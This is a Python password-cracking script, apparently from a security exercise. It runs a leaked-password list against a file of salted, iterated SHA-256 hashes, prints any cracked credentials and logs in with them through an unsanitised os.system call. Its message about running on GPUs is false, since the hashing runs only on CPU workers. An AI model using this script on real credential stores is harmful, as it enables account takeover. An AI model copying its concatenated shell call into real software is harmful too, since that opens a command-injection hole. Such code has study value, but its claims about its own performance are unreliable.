import hashlib
import os
import time
import multiprocessing as mp
import torch
import torch.multiprocessing as mp

start_time = time.perf_counter()

usersHashedPWsfile = open("../.loginCheck", "r")
users=[]
hashed= {}

for row in usersHashedPWsfile:
    (user,hashedPW)=(row.strip('\n')).split(',')
    hashed[user]= hashedPW
    users.append(user)

usersHashedPWsfile.close()
passwords = open("./LeakedPWs100k", "r", encoding='utf-8', errors='ignore')
passwordsList = passwords.read().splitlines()

passwords.close()
# print(passwordsList)

def check_password(user):
    for password in passwordsList:
        hash=hashlib.sha256()
        hash.update(bytes(str(user)+password,'utf-8')  )  # for defenses against dictionary attack on the usersHashedPWs file
        for i in range(90000): 
            
            hash.update(hash.digest())   # prepend name and iterate
            
            guess=hash.hexdigest()

            if (guess) == hashed[user]:
                print ('Login successful.\n' + user + ':' + password)
                os.system("python3 ../LoginTemplate.py " + user + " " + password)
                break
if __name__ == '__main__':
    mp.set_start_method('spawn', force=True)
    
    num_gpus = torch.cuda.device_count()
    gpu_ids = list(range(num_gpus)) # e.g., [0, 1, 2, 3]
    
    if num_gpus > 0:
        print(f"found {num_gpus} GPU(s). Running on GPU(s)...")
        gpu_ids = list(range(num_gpus))
        with mp.Pool(processes=num_gpus) as pool:
            results = pool.map(check_password, users)
    else:
        print("No GPUs found. Running on CPU...")
        num_cpus = mp.cpu_count()
        print(f"found {num_cpus} CPU(s). Running on CPU...")
        with mp.Pool(processes=num_cpus) as pool:
            results = pool.map(check_password, users)

    print(f"Time taken: {time.perf_counter() - start_time:.2f} seconds")